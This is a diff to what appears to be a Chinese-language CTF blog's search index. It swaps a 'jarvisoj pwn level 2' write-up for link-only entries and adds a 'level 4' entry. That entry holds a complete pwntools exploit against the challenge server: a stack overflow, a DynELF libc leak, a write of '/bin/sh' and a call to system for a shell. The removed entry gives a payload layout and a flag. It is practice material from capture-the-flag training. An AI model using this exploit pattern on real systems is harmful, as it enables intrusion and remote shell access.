@@ -4,27 +4,39 @@
   
   
   <entry>
-    <title>jarvisoj pwn level 2</title>
-    <link href="/2020/01/29/jarvisoj-pwn-level-2/"/>
-    <url>/2020/01/29/jarvisoj-pwn-level-2/</url>
+    <title>XCTF int_overflow</title>
+    <link href="/2020/02/03/XCTF-int-overflow/"/>
+    <url>/2020/02/03/XCTF-int-overflow/</url>
     
-    <content type="html"><![CDATA[<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>首先用checksec进行初步的检查。<br>可以发现它是X86并且打开了NX的保护（因此不能像level1一样构造shellcode来进行攻击）</p><pre><code>Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><p>用IDA打开发现它引用了system的系统函数，但是里面并没有/bin/sh我们用ctrl+s寻找/bin/sh的字符串地址为：</p><blockquote><p>0x0804A024<br>现在有两种攻击思路：<br>payload=a<em>0x88(buf)+a</em>4(ebp)+system地址+构造的任意的system函数返回地址+’/bin/sh’字符串的地址(system函数的参数)<br>2.a<em>0x88(buf)+a</em>4(ebp)+call_system地址+’/bin/sh’字符串的地址(system函数的参数)</p></blockquote><p>exp就不贴了。</p><blockquote><p>flag:CTF{1759d0cbd854c54ffa886cd9df3a3d52}</p></blockquote>]]></content>
-    
-    
-    <categories>
-      
-      <category>pwn</category>
-      
-    </categories>
+    <content type="html"><![CDATA[<p><a href="https://www.52pojie.cn/thread-1032448-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1032448-1-1.html</a></p>]]></content>
     
     
-    <tags>
-      
-      <tag>pwn</tag>
-      
-      <tag>jarvisoj</tag>
-      
-    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>jarvisoj pwn smashes</title>
+    <link href="/2020/02/01/jarvisoj-pwn-smashes/"/>
+    <url>/2020/02/01/jarvisoj-pwn-smashes/</url>
+    
+    <content type="html"><![CDATA[<h1 id="smashes"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</h1><p><a href="https://blog.csdn.net/kevin66654/article/details/86773547" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773547</a></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>jarvisoj pwn level 4</title>
+    <link href="/2020/01/30/jarvisoj-pwn-level-2/"/>
+    <url>/2020/01/30/jarvisoj-pwn-level-2/</url>
+    
+    <content type="html"><![CDATA[<h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>checksec 是x86的题目用IDA打开没有libc文件，通过查询知道了一个DynELF，可以泄露出libc从哪里开始的。<br>下面是EXP：</p><pre><code>from pwn import *re = remote(&quot;pwn2.jarvisoj.com&quot;,9880)elf = ELF(&#39;./level4&#39;)write_plt = elf.symbols[&#39;write&#39;]vul_addr=0x804844bbss_addr=0x0804a024def leak(address):        payload = &#39;a&#39;*0x88 + &#39;a&#39;*4 + p32(write_plt) + p32(vul_addr) + p32(1) + p32(address) + p32(4)        re.sendline(payload)        data = re.recv(4)        return datawow = DynELF(leak,elf=elf)system_addr = wow.lookup(&#39;system&#39;,&#39;libc&#39;)read_plt = elf.symbols[&#39;read&#39;]payload2 = &#39;a&#39;*0x88 + &#39;a&#39;*4 + p32(read_plt) + p32(vul_addr) + p32(1) + p32(bss_addr) + p32(8)re.sendline(payload2)re.send(&#39;/bin/sh\x00&#39;)payload3 = &#39;a&#39;*0x88 +&#39;a&#39;*4 + p32(system_addr) +p32(0) + p32(bss_addr)re.sendline(payload3)re.interactive()</code></pre>]]></content>
+    
+    
     
   </entry>
   
